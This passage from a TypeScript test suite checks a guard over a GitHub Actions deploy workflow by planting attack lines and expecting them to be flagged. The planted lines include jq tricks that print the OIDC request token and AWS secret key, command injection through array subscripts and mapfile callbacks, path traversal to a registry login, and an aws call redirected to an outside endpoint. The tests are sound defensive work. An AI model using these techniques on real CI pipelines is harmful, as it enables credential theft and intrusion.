            `cloudformation describe-stacks --stack-name Hearth-restore-${part} --query Stacks[0].[StackStatus, LastUpdatedTime || CreationTime] --output json`,
        ),
      )
      for (const [env, want] of [
        [{ RESTORE: 'up' }, [['restore/*']]],
        [{ STAGE: 'prod', MODE: 'rollback', RESTORE: 'none' }, [['prod/Tasks', 'prod/Services']]],
        [{ STAGE: 'prod', MODE: 'deploy', RESTORE: 'none' }, [['prod/*']]],
      ] as const) {
        const other = diff({}, env)
        const stage = 'STAGE' in env ? env.STAGE : 'restore'
        expect(other.status, JSON.stringify(env)).toBe(0)
        expect(other.diffed, JSON.stringify(env)).toEqual(want)
        expect(other.aws.trim().split('\n'), JSON.stringify(env)).toEqual(
          ['Platform', 'Data', 'Tasks', 'Services'].map(
            part =>
              `cloudformation describe-stacks --stack-name Hearth-${stage}-${part} --query Stacks[0].[StackStatus, LastUpdatedTime || CreationTime] --output json`,
          ),
        )
        expect(other.output, JSON.stringify(env)).toBe(
          'basis=Platform:missing,Data:missing,Tasks:missing,Services:missing,\n',
        )
      }
    } finally {
      rmSync(scratch, { recursive: true, force: true })
    }
  })
})

describe('Round 8, attack 1: the ways past the allowlist (DPW-06, DPW-08, DPW-10)', () => {
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const commands = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${COMMANDS}`
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const evaluates = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${EVALUATES}`
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const WRITES = "writes no file but its outputs, its summary, prod-plan's diff and /dev/null"
  const CDK_ONCE = 'assigns CDK only in the preamble, as the bin of the registry package CLI_FETCH unpacked'

  // FETCH-A1-01: the write rule let every credentialed run write to "$DIFF", "set by its one line", and held
  // that line only against DIFF=, so printf -v DIFF (or read, mapfile or a for loop) in AWS_CHECK pointed the
  // write at the CLI CLI_CHECK had checked, which then ran the line with the deploy role's credentials; CDK was
  // held the same way, so printf -v CDK made "$CDK" another program. A canonical text now sets none of
  // HELD_NAMES in any spelling (but the preamble's CDK line), every rule that holds one reads the names a
  // builtin is handed too, and only prod-plan's two diff runs may write to "$DIFF".
  it("holds DIFF, CDK, ASSEMBLY and STAGE to their one line in every spelling, and the diff's write to prod-plan's diff runs (FETCH-A1-01)", () => {
    const anchor = '  [ "$stage" = restore ] && stage=prod\n'
    expect(AWS_CHECK).toContain(anchor)
    const set = `  printf -v DIFF '%s' "$RUNNER_TEMP/aws-cdk/package/bin/cdk"`
    const write = `  [ ! -f "$DIFF" ] || printf '%s\\n' 'process.stderr.write("x\\n");' >>"$DIFF"`
    const planted = AWS_CHECK.replace(anchor, `${anchor}${set}\n${write}\n`)
    expect(canonicalTextFindings({ AWS_CHECK: planted })).toContain(
      commands('AWS_CHECK', planted.split('\n').indexOf(set) + 1),
    )
    // Every spelling that sets a held name, in any canonical text.
    for (const name of ['DIFF', 'CDK', 'ASSEMBLY', 'STAGE']) {
      for (const text of [
        `printf -v ${name} '%s' "$x"`,
        `IFS= read -r ${name} <<<"$x"`,
        `mapfile -t ${name} < <(jq -n '1')`,
        `for ${name} in x; do :; done`,
        `local ${name}`,
        `local ${name}=x`,
        `${name}=x`,
        `${name}+=x`,
      ]) {
        expect(canonicalTextFindings({ X: `x=1\n${text}` }), text).toContain(commands('X', 2))
      }
    }
    // The preamble's own CDK line, and every committed text, pass.
    expect(canonicalCommandLines(PREAMBLE, new Set(['mask', 'run', 'get']))).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
    // In a credentialed run's whole text, a builtin naming DIFF and a write to "$DIFF" outside prod-plan's
    // two diff runs are each this rule's finding, whatever the pins and the canonical rules say.
    const whatRuns = (added: string) =>
      credentialedCodeFindings(
        addedBefore('nonprod', 'What runs', `          ${anchor}`, `          ${added}\n`),
        manifests,
        lockfile,
      )
    for (const added of [
      `printf -v DIFF '%s' "$RUNNER_TEMP/aws-cdk/package/bin/cdk"`,
      'read -r DIFF <<<"$RUNNER_TEMP/x"',
      'for DIFF in "$RUNNER_TEMP/x"; do :; done',
      'echo x >>"$DIFF"',
      ': >"$DIFF"',
    ]) {
      expect(whatRuns(added), added).toContain(at('nonprod (What runs)', WRITES))
    }
    // CDK, by a builtin, anywhere: this rule in every job, the pins aside.
    const preambleCdk = '          CDK="$RUNNER_TEMP/aws-cdk/package/bin/cdk"\n'
    for (const added of ["printf -v CDK '%s' true", 'read -r CDK <<<"x"', 'for CDK in true; do :; done']) {
      const found = credentialedCodeFindings(
        addedBefore('nonprod', 'What runs', preambleCdk, `${preambleCdk}          ${added}\n`),
        manifests,
        lockfile,
      )
      expect(found, added).toContain(at('nonprod (What runs)', CDK_ONCE))
    }
    // STAGE, by a builtin, in any job's run (DPW-06).
    expect(
      deployStepFindings(
        addedBefore('nonprod', 'What runs', `          ${anchor}`, `          read -r STAGE <<<"x"\n`),
      ),
    ).toContain(`${DEPLOY}: DPW-06 nonprod: sets STAGE once, at the job, to nonprod`)
    // prod-plan's diff runs, as committed, still write the diff.
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
    expect(DIFF_RUN).toContain('} >"$DIFF" || STATUS=$?')
    expect(ROLLBACK_DIFF_RUN).toContain('} >"$DIFF" || STATUS=$?')
  })

  // FLOW-A1-01: testShaped() counted an unquoted $definition as one operand of [ -n $definition ], but bash
  // splits it first, so a value 'x -o -v a[$(cmd)]' handed [ a -v whose subscript bash evaluated, running cmd.
  // A [ or test whose words bash could split, glob or expand a tilde in is no longer shaped, and one standing
  // after a redirection, an assignment or a wrapper (run [ …), which TEST_START never read, is refused too.
  it('refuses a [ or test whose operand bash would split, and one no shape check reads (FLOW-A1-01)', () => {
    const anchor = `    definition=$(output "$\{kind^}TaskDefinition")\n`
    expect(TASKS_OUTPUTS).toContain(anchor)
    const test = `    [ -n $definition ] || { echo "tasks: Hearth-$STAGE-Tasks has no $kind definition" | mask; exit 1; }`
    const planted = TASKS_OUTPUTS.replace(anchor, `${anchor}${test}\n`)
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(
      evaluates('TASKS_OUTPUTS', planted.split('\n').indexOf(test) + 1),
    )
    for (const text of [
      '[ -n $x ]',
      '[ $x ]',
      '[ -f $x ]',
      '[ $(jq -r .a <<<"$x") = y ]',
      '[ -n "a"$x ]',
      `[ -n $\{x} ]`,
      '[ "$x" = * ]',
      '[ "$x" = ~ ]',
      '[ "$x" = {a,b} ]',
      '! [ $x = y ]',
      'run [ -n "$x" ]',
      '2>/dev/null [ -n "$x" ]',
      'y=1 [ -n "$x" ]',
    ]) {
      expect(outsideEvaluations(`x=1\n${text}`), text).toContain(1)
      expect(evaluatedLines(`x=1\n${text}`), text).toContain(1)
    }
    // A quoted operand, a substitution in double quotes and a test after a command's start pass.
    for (const text of [
      '[ -n "$x" ]',
      '[ "$(jq -r \'.a\' <<<"$x")" = y ]',
      'if [ "$x" = y ] && [ -z "$x" ]; then :; fi',
      '[ "$x" -gt 0 ] || exit 1',
    ]) {
      expect(evaluatedLines(`x=1\n${text}`), text).toEqual([])
    }
  })

  // INPUTS-A1-01: prod-plan's diff of a restore taken down skipped each stack that didn't exist or that a failed
  // create left, and prod's down decided again, after the approval, which stacks it deploys, so a second
  // restore's up between the two had down deploy stacks no diff showed. prod-plan now outputs what it read of
  // each stack, and down refuses, before any deploy, unless it reads the same (its run is pinned, PLANNED its
  // env and down prod-plan's output: DPW-08, and the bash cases beside DPW-06 and DPW-08 above).
  it("binds a restore taken down to the stacks prod-plan's diff read (INPUTS-A1-01)", () => {
    expect(RESTORE_DOWN_DIFF).toContain(
      '  if [ "$DOWN_STATUS" = 0 ]; then echo "down=$DOWN_READ" >>"$GITHUB_OUTPUT"; fi\n',
    )
    expect(RESTORE_DOWN.startsWith("SEEN=''\nfor PART in Services Data Platform; do\n")).toBe(true)
    expect(RESTORE_DOWN).toContain('if [ "$SEEN" != "$PLANNED" ]; then')
    // The check comes before every deploy down makes.
    expect(RESTORE_DOWN.indexOf('"$PLANNED"')).toBeLessThan(RESTORE_DOWN.indexOf(CDK_DEPLOY_DOWN))
    expect(STEP_ENVS.prod?.['Take the restore stage down']).toEqual({
      PLANNED: `\${{ needs.prod-plan.outputs.down }}`,
    })
    expect(JOB_OUTPUTS['prod-plan']).toEqual({
      attempt: `\${{ github.run_attempt }}`,
      down: `\${{ steps.diff.outputs.down }}`,
      basis: `\${{ steps.diff.outputs.basis }}`,
    })
    expect(prodPathFindings(workflows)).toEqual([])
  })
})

describe('Round 8, attack 2: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const at10 = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const at07 = (where: string, rule: string) => `${DEPLOY}: DPW-07 ${where}: ${rule}`
  const CLI =
    'runs the CLI only as deploy or diff, with --app "$ASSEMBLY" (set once to the folder it downloaded), after CDK_FOLDER and no other change of folder, with --no-lookups --no-notices, a deploy with --require-approval never --ci --exclusively --no-previous-parameters and a diff with --method template, and no word but its stacks, one of the sets CLI_STACKS writes for its command (a deploy never every stack), and the flags the canonical lines write, so no short alias or other option the CLI reads'
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const FILE_NAMES =
    "sets a name jq's data words build a path from (dir, file, template, stackfiles, queue, name, root) only on ASSET_CHECK's own lines, and reads one only in a loop fed by its own done line, so jq reads no file a line doesn't show"
  const STOP =
    "names the stop token only on STOP_COMMANDS's two lines, where it is made and stops the runner reading workflow commands, so no line prints ::<token>:: and resumes them"
  const canonical = (name: string, line: number, rule: string, id = 'DPW-10') =>
    `${GUARD}: ${id} ${name}, line ${line}: ${rule}`

  // INPUTS-A2-01: the CLI deploys with --previous-parameters unless told otherwise, sending CloudFormation
  // UsePreviousValue for every parameter the deployed stack already has, so a template's Default, all the
  // approver's diff can show, never deployed: a release added a parameter read by nothing, then changed its
  // Default and made a grant conditional on it. Every deploy line now passes --no-previous-parameters, the one
  // word on its line that names previous parameters, so each parameter deploys from its template's Default
  // (an SSM-typed one's names the parameter-store entry whose value deploys, which ASSET_CHECK holds to the
  // workload's own entries: INPUTS-A3-01).
  it('deploys every stack with --no-previous-parameters, so each parameter deploys from the Default the diff shows (INPUTS-A2-01)', () => {
    const deploys = deployText.split('\n').filter(line => line.includes('"$CDK" deploy'))
    expect(deploys).toHaveLength(10)
    for (const line of deploys) expect(line.match(/previous/gi), line).toEqual(['previous'])
    for (const line of deploys) expect(line).toContain(' --no-previous-parameters ')
    for (const line of [
      CDK_DEPLOY_FORWARD,
      CDK_DEPLOY_SERVICES,
      CDK_DEPLOY_DRILL,
      CDK_DEPLOY_ROLLBACK,
      CDK_DEPLOY_DOWN,
    ]) {
      expect(line).toContain(' --no-previous-parameters ')
    }
    // Without it, or with it set back, a deploy line is this rule's finding.
    const services = '"$STAGE/Services" --exclusively --no-previous-parameters'
    for (const to of [
      '"$STAGE/Services" --exclusively',
      '"$STAGE/Services" --exclusively --no-previous-parameters --previous-parameters',
      '"$STAGE/Services" --exclusively --no-previous-parameters --previousParameters=true',
      '"$STAGE/Services" --exclusively --previous-parameters=false',
    ]) {
      expect(credentialedCodeFindings(plant(services, to, job('nonprod')), manifests, lockfile), to).toContain(
        at10('nonprod (Deploy Services)', CLI),
      )
    }
    // A diff names none.
    expect(
      credentialedCodeFindings(
        plant(
          '--method template --no-lookups',
          '--method template --previous-parameters --no-lookups',
          job('prod-plan'),
        ),
        manifests,
        lockfile,
      ),
    ).toContain(at10('prod-plan (Diff)', CLI))
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  // EXPAND-A2-01: testShaped() read a [ test's words as written, up to its first ], with \( and \) inside one
  // word; bash hands [ "$@" or "${a[@]}" as several words, takes every word to the command's end, and reads
  // \( as a parenthesis. So need() { [ "$@" ]; } called as need -n $x, [ -n ] -o '-v' "$x" ] and
  // [ \( -n "$x" -o '-v' "$x" \) ] each had bash evaluate -v on a value from outside the text.
  it('reads a [ or test as bash hands it its words (EXPAND-A2-01)', () => {
    const definition = `    definition=$(output "$\{kind^}TaskDefinition")\n`
    const output = '  output() {'
    expect(TASKS_OUTPUTS).toContain(definition)
    expect(TASKS_OUTPUTS).toContain(output)
    const need = `  need() { [ "$@" ] || { echo "tasks: Hearth-$STAGE-Tasks has no $kind definition" | mask; exit 1; }; }`
    const planted = TASKS_OUTPUTS.replace(output, `${need}\n${output}`).replace(
      definition,
      `${definition}    need -n $definition\n`,
    )
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(
      canonical('TASKS_OUTPUTS', planted.split('\n').indexOf(need) + 1, EVALUATES),
    )
    for (const test of [
      `    [ -n ] -o '-v' "$definition" ]`,
      `    [ \\( -n "$definition" -o '-v' "$definition" \\) ]`,
    ]) {
      const text = TASKS_OUTPUTS.replace(definition, `${definition}${test}\n`)
      expect(canonicalTextFindings({ TASKS_OUTPUTS: text }), test).toContain(
        canonical('TASKS_OUTPUTS', text.split('\n').indexOf(test) + 1, EVALUATES),
      )
    }
    for (const text of [
      'need() { [ "$@" ] || exit 1; }',
      'need() { test "$@" || exit 1; }',
      `[ "$\{a[@]}" ]`,
      `test "$\{a[@]}"`,
      `[ "$\{@:1}" ]`,
      '[ "$*" ]',
      `[ -n ] -o '-v' "$x" ]`,
      `[ \\( -n "$x" -o '-v' "$x" \\) ]`,
      '[ "(" -n "$x" ")" ]',
      `[ '!' "$x" ]`,
      '[ "$x" = "-v" ]',
      '[ -n "$x" ] >/dev/null',
    ]) {
      expect(outsideEvaluations(`x=1\n${text}`), text).toContain(1)
      expect(evaluatedLines(`x=1\n${text}`), text).toContain(1)
    }
    // A count, a quoted literal and the committed texts pass.
    for (const text of [
      `[ "$\{#queue[@]}" -gt 0 ]`,
      `[ "$x" = 'Services' ]`,
      '[ "$x" != "$y" ] || exit 1',
      '[ ! -f "$x" ]',
    ]) {
      expect(evaluatedLines(`x=1\n${text}`), text).toEqual([])
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // COMMANDS-A2-01: jq's data words were held to "$RUNNER_TEMP/…" or "$dir/…" with no .. part as written, so a
  // name set to a path climbing out by .. ("$RUNNER_TEMP/$login") read the registry login skopeo keeps outside
  // the temp folder and printed it. jq's data words are now seven literals, and the names they build a path from
  // are set only on ASSET_CHECK's own lines, each loop that reads one fed only by its own done line.
  it("hands jq only the files its lines name, and the names they build from only ASSET_CHECK's lines (COMMANDS-A2-01)", () => {
    const anchor = '  HAS_DATABASE=$(output HasDatabase)\n'
    expect(TASKS_OUTPUTS).toContain(anchor)
    const read = `  jq -r '.auths[] | .auth' "$RUNNER_TEMP/$login"`
    const planted = TASKS_OUTPUTS.replace(anchor, `${anchor}  local login=../../x\n${read}\n`)
    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(
      canonical('TASKS_OUTPUTS', planted.split('\n').indexOf(read) + 1, TOOLS),
    )
    expect(canonicalToolLines(planted)).toContain(planted.split('\n').indexOf(read))
    // jq's file words outside the seven.
    for (const word of [
      '"$RUNNER_TEMP/x.json"',
      '"$dir/$path"',
      'infra/x.json',
      '../package-lock.json',
      '"$dir/../x"',
    ]) {
      expect(canonicalToolLines(`jq -r . ${word}`), word).toEqual([0])
    }
    // Setting one of the names a file word builds from, anywhere but ASSET_CHECK's own lines.
    for (const lines of [
      'local dir=../../x file=auth.json',
      'for file in ../x; do :; done',
      "read -r file <<<'../x'",
      "printf -v file '%s' x",
      'template=../x',
      'queue+=(../x)',
    ]) {
      const text = TASKS_OUTPUTS.replace(anchor, `${anchor}  ${lines}\n`)
      expect(canonicalTextFindings({ TASKS_OUTPUTS: text }), lines).toContain(
        canonical('TASKS_OUTPUTS', text.split('\n').indexOf(`  ${lines}`) + 1, FILE_NAMES),
      )
    }
    // In ASSET_CHECK itself, a loop that reads one fed by another done line, a new setting line, and a while
    // whose do stands on a line of its own.
    const done = `    done < <(jq -r '(.artifacts // {})[] | .additionalMetadataFile // empty' "$dir/manifest.json")`
    expect(ASSET_CHECK).toContain(`${done}\n`)
    const fed = ASSET_CHECK.replace(done, `    done < <(printf '%s\\n' x)`)
    expect(canonicalTextFindings({ ASSET_CHECK: fed })).toContain(
      canonical('ASSET_CHECK', fed.split('\n').indexOf(`    done < <(printf '%s\\n' x)`) + 1, FILE_NAMES),
    )
    const setter = ASSET_CHECK.replace('    stackfiles=()\n', '    stackfiles=()\n    file=../x\n')
    expect(canonicalTextFindings({ ASSET_CHECK: setter })).toContain(
      canonical('ASSET_CHECK', setter.split('\n').indexOf('    file=../x') + 1, FILE_NAMES),
    )
    const split = ASSET_CHECK.replace(
      '    stackfiles=()\n    while IFS= read -r file; do\n',
      '    stackfiles=()\n    while IFS= read -r file\n    do\n',
    )
    expect(canonicalTextFindings({ ASSET_CHECK: split })).toContain(
      canonical('ASSET_CHECK', split.split('\n').indexOf('    while IFS= read -r file') + 1, FILE_NAMES),
    )
    expect(canonicalTextFindings()).toEqual([])
  })

  // Round 13: an asset check reads its folder and its release from its step's env: (ASSEMBLY_FOLDER and RELEASE),
  // so no canonical text sets a name a step's or a job's env: gives, in any spelling, or a line of ASSET_CHECK could
  // point the calls after it at another folder or release; and none expands ASSEMBLY_FOLDER, which only those
  // calls read.
  it("sets no name an env: gives in a canonical text, and expands ASSEMBLY_FOLDER only on an asset check's calls (round 13)", () => {
    const ENV_GIVEN =
      "sets no name a step's or a job's env: gives (STEP_ENVS's names and STAGE), in any spelling, so a pinned call line reads from its step's env: what STEP_ENVS pins"
    const EXPANDS =
      "expands only a name a canonical text sets, one its step's or job's env: gives from no secret or token (but ASSEMBLY_FOLDER, which only an asset check's own calls read), the one-offs' TOKEN, the assembly's folder, prod-plan's diff file, or the runner's outputs, summary, folder, run ids, address and commit, so no canonical text prints the OIDC request token or another credential its job holds"
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(envGivenLines(text, name), name).toEqual([])
    // Each way bash sets a name, for the asset check's two names, the PREVIOUS it read before and the job's STAGE,
    // at ASSET_CHECK's top and at STOP_HEAD's end.
    const forms = (name: string) => [
      `${name}=x`,
      `${name}="x"`,
      `[ -n "$${name}" ] && ${name}=x`,
      `: "\${${name}:=x}"`,
      `local ${name}=x`,
      `local ${name}`,
      `for ${name} in x; do :; done`,
      `IFS= read -r ${name} <<<'x'`,
      `mapfile -t ${name} <<<'x'`,
      `printf -v ${name} '%s' x`,
      `${name}+=x`,
      `(( ${name} = 1 ))`,
    ]
    const end = STOP_HEAD.split('\n').length
    for (const name of ['ASSEMBLY_FOLDER', 'RELEASE', 'PREVIOUS', 'STAGE']) {
      for (const form of forms(name)) {
        expect(envGivenLines(`${form}\n${ASSET_CHECK}`, 'ASSET_CHECK'), form).toContain(0)
        expect(envGivenLines(`${STOP_HEAD}\n${form}`, 'STOP_HEAD'), form).toContain(end)
      }
      expect(canonicalTextFindings({ STOP_HEAD: `${STOP_HEAD}\n${name}=x` })).toContain(
        canonical('STOP_HEAD', end + 1, ENV_GIVEN),
      )
    }
    // declare, typeset, unset, readonly, eval and export off its lines run no command CANONICAL_COMMANDS names.
    for (const form of [
      'declare ASSEMBLY_FOLDER=x',
      'typeset ASSEMBLY_FOLDER=x',
      'unset ASSEMBLY_FOLDER',
      'readonly ASSEMBLY_FOLDER',
      "eval 'ASSEMBLY_FOLDER=x'",
      'export ASSEMBLY_FOLDER=x',
    ]) {
      expect(canonicalCommandLines(`${STOP_HEAD}\n${form}`, new Set()), form).toContain(end)
    }
    // A canonical text that expands ASSEMBLY_FOLDER is DPW-07's, though a step's env: gives it; RELEASE, which
    // AWS_CHECK's ecr_has calls expand, it may.
    const expands = `${STOP_HEAD}\necho "$ASSEMBLY_FOLDER"`
    expect(foreignExpansionLines(expands)).toEqual([end])
    expect(canonicalTextFindings({ STOP_HEAD: expands })).toContain(canonical('STOP_HEAD', end + 1, EXPANDS, 'DPW-07'))
    expect(foreignExpansionLines(`${STOP_HEAD}\necho "$RELEASE"`)).toEqual([])
  }, 60_000)

  // COMMANDS-A2-02: the stop token was a name STOP_HEAD sets, so any canonical text could expand it, and
  // echo "::$stop_token::" resumed workflow commands for the rest of the step: a ##[add-mask] in a release's
  // own template text then hid a line of the approver's diff. The token is named on STOP_COMMANDS's two lines
  // alone, in every run and canonical text.
  it("names the stop token only on STOP_COMMANDS's two lines (COMMANDS-A2-02)", () => {
    expect(STOP_COMMANDS).toBe('stop_token=$(openssl rand -hex 16)\necho "::stop-commands::$stop_token"')
    const resume = '          echo "::$stop_token::"\n'
    expect(maskingFindings(addedBefore('prod-plan', 'Diff', '          cat "$DIFF"\n', resume))).toContain(
      at07('prod-plan (Diff)', STOP),
    )
    const anchor = '  [ "$stage" = restore ] && stage=prod\n'
    expect(AWS_CHECK).toContain(anchor)
    for (const line of [
      '  echo "::$stop_token::"',
      `  printf '%s\\n' "::$\{stop_token}::"`,
      '  token=$stop_token',
      '  stop_token=x',
      '  echo "::stop-commands::$stop_token"x',
    ]) {
      const text = AWS_CHECK.replace(anchor, `${anchor}${line}\n`)
      expect(canonicalTextFindings({ AWS_CHECK: text }), line).toContain(
        canonical('AWS_CHECK', text.split('\n').indexOf(line) + 1, STOP, 'DPW-07'),
      )
    }
    expect(maskingFindings(workflows)).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })
})

describe('Round 8, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const at07 = (where: string, rule: string) => `${DEPLOY}: DPW-07 ${where}: ${rule}`
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const ENV =
    'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
  const canonical = (name: string, line: number, rule: string, id = 'DPW-10') =>
    `${GUARD}: ${id} ${name}, line ${line}: ${rule}`
  const plantAfter = (text: string, anchor: string, added: string) => {
    expect(text).toContain(`${anchor}\n`)
    const planted = text.replace(`${anchor}\n`, `${anchor}\n${added}\n`)
    return { planted, line: planted.split('\n').indexOf(added) + 1 }
  }

  // FETCH-A3-01: jq's env builtin was refused by words JQ_REACH and QUOTED_ENV read with a - beside them
  // excluded, but jq names hold no -, so -env.X is env.X negated: negating a string throws an error that prints
  // it, and try … catch . printed the OIDC request token in slices from CLI_FETCH, and the AWS secret from
  // AWS_CHECK. A - beside a word of jq's own is now read as the operator it is.
  it("reads jq's env builtin wherever an operator stands beside it (FETCH-A3-01)", () => {
    const fetch = plantAfter(
      CLI_FETCH,
      'mkdir "$RUNNER_TEMP/aws-cdk"',
      `jq -rn 'range(0; 4000; 8) as $i | try -env.ACTIONS_ID_TOKEN_REQUEST_TOKEN[$i:$i+8] catch .'`,
    )
    expect(canonicalTextFindings({ CLI_FETCH: fetch.planted })).toContain(canonical('CLI_FETCH', fetch.line, TOOLS))
    const anchor = '  [ "$stage" = restore ] && stage=prod'
    const check = plantAfter(AWS_CHECK, anchor, `  jq -rn 'try -env.AWS_SECRET_ACCESS_KEY catch .'`)
    expect(canonicalTextFindings({ AWS_CHECK: check.planted })).toContain(canonical('AWS_CHECK', check.line, TOOLS))
    for (const program of [
      'try -env.X catch .',
      'try -$ENV.X catch .',
      '{a:1} | .a-env',
      'try (1-env.X) catch .',
      'env-1',
      'try (env.X-1) catch .',
      'env.X',
      '- env.X',
    ]) {
      expect(canonicalToolLines(`x=$(jq -rn '${program}')`), program).toEqual([0])
    }
    // In the run as the job holds it, each of the credentialed jobs' copies.
    const run = addedBefore(
      'nonprod',
      'The pinned CDK CLI',
      '          mkdir "$RUNNER_TEMP/aws-cdk"\n',
      "          jq -rn 'try -env.ACTIONS_ID_TOKEN_REQUEST_TOKEN catch .'\n",
    )
    expect(maskingFindings(run)).toContain(at07('nonprod (The pinned CDK CLI)', ENV))
    // A field and a variable of that name are none.
    for (const program of ['.env', '$env']) {
      expect(canonicalToolLines(`x=$(jq -rn --arg env 1 '${program}')`), program).toEqual([])
    }
    expect(maskingFindings(workflows)).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })

  // COMMANDS-A3-01: a setter builtin's words were read by NAME_TAKER on the code view only up to its first
  // redirection, so a subscripted name or mapfile's -C callback after one (read -r x < <(…) 'a[$(…)]') ran a
  // command, with the deploy role's session, in PROBE. A command's words were also read only up to an & or |,
  // though >&2, &>x and >|x are redirections bash goes on past, so aws, gh, jq and read were handed words no
  // hold read. Each setter is now read to its command's end past its redirections, as bash hands it its words.
  it("reads a command's words to its end, past its redirections (COMMANDS-A3-01)", () => {
    const anchor = `  mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`
    for (const added of [
      `  read -r PWN < <(echo x) 'a[$(touch "$RUNNER_TEMP/pwn")]'`,
      `  mapfile < <(echo x) -C 'touch "$RUNNER_TEMP/pwn";:' -c 1 -t IGN`,
      `  read -r PWN >&2 'a[$(touch "$RUNNER_TEMP/pwn")]' <<<x`,
      `  read -r PWN &>/dev/null 'a[$(touch "$RUNNER_TEMP/pwn")]' <<<x`,
      `  mapfile -t IGN >|/dev/null -C 'touch "$RUNNER_TEMP/pwn";:' < <(echo x)`,
      `  printf </dev/null -v PATH '%s' /tmp`,
    ]) {
      const probe = plantAfter(PROBE, anchor, added)
      expect(canonicalTextFindings({ PROBE: probe.planted }), added).toContain(
        canonical('PROBE', probe.line, EVALUATES),
      )
    }
    // A name a redirection comes before is still read as the name it is, so PATH is no read's.
    const path = plantAfter(PROBE, anchor, `  read -r X >&2 PATH <<<x`)
    expect(canonicalTextFindings({ PROBE: path.planted })).toContain(canonical('PROBE', path.line, COMMANDS))
    // Each held tool is handed what follows a redirection with an & or a | in it.
    for (const line of [
      `x=$(get aws ecr describe-images --repository-name hearth-server >&2 --endpoint-url https://198.51.100.7 --query 'imageDetails[0].imageTags' --output json)`,
      `x=$(get aws ecr describe-images --repository-name hearth-server 2>&1 --endpoint-url https://198.51.100.7 --output json)`,
      'gh api "repos/$REPO/deployments" >&2 --input /etc/hostname',
      'gh api "repos/$REPO/deployments" >|/dev/null --input /etc/hostname',
      `x=$(jq -rn >&2 'env')`,
    ]) {
      expect(canonicalToolLines(line), line).toEqual([0])
    }
    // The committed setters and a here-string's or a substitution's redirection pass.
    for (const text of [
      `mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$x")`,
      'while IFS= read -r name; do :; done <<<"$x"',
      `IFS=$'\\t' read -r path key <<<"$x"`,
      'read -r x <<<"$y" 2>/dev/null',
    ]) {
      expect(outsideEvaluations(text), text).toEqual([])
    }
    expect(shellCommands('read -r x >&2 y <<<z')[0]?.tail).toBe(' -r x >&2 y <<<z')
    expect(canonicalTextFindings()).toEqual([])
  })

  // FLOW-A3-01: a for loop over literal words was held safe wherever its name was evaluated, and so was a
  // local with no value; but arithmetic reads a name's value as an expression in its turn, so $((count)) over
  // the word revision evaluated $revision, an outside value, and a local REPLY that read filled with no name
  // given evaluated it too. Where bash evaluates a name as arithmetic, a loop's words must be numbers, and every
  // name the text evaluates is lower-case, never one bash sets on its own.
  it('evaluates as arithmetic only names whose every value is a number (FLOW-A3-01)', () => {
    const definition = `    definition=$(output "$\{kind^}TaskDefinition")`
    const added = [
      '    a=(0)',
      `    revision=$\{definition##*:}`,
      '    for count in revision; do',
      '      seen=$((count))',
      '    done',
    ].join('\n')
    const loop = plantAfter(TASKS_OUTPUTS, definition, added)
    expect(canonicalTextFindings({ TASKS_OUTPUTS: loop.planted })).toContain(
      canonical('TASKS_OUTPUTS', loop.planted.split('\n').indexOf('      seen=$((count))') + 1, EVALUATES),
    )
    for (const [text, line] of [
      ['a=(0)\nrevision=$1\nfor count in revision; do seen=$((count)); done', 2],
      ['f() {\n  local REPLY\n  read -r <<<"$1"\n  seen=$((REPLY))\n}', 3],
      ['f() {\n  local MAPFILE\n  mapfile -t <<<"$1"\n  seen=$((MAPFILE))\n}', 3],
      ['f() {\n  local _\n  echo "$1"\n  seen=$((_))\n}', 3],
      ['N=0\nseen=$((N + 1))', 1],
      [`for count in revision; do echo "$\{a[count]}"; done`, 0],
      [`for count in revision; do echo "$\{x:count}"; done`, 0],
    ] as const) {
      expect(outsideEvaluations(text), text).toContain(line)
    }
    // A loop over numbers, a name built from a loop's words, a literal's arithmetic and SECONDS pass.
    for (const text of [
      'for i in 1 2 3; do seen=$((i + 1)); done',
      `for kind in a b; do printf -v "$\{kind^^}_X" %s 1; done`,
      'n=0\nn=$((n + 1))',
      'DEADLINE=$((SECONDS + 30 * 60))',
    ]) {
      expect(outsideEvaluations(text), text).toEqual([])
    }
    expect(canonicalTextFindings()).toEqual([])
  })
})

describe('Round 8, attack 4: the ways past the allowlist (DPW-10, DPW-11)', () => {
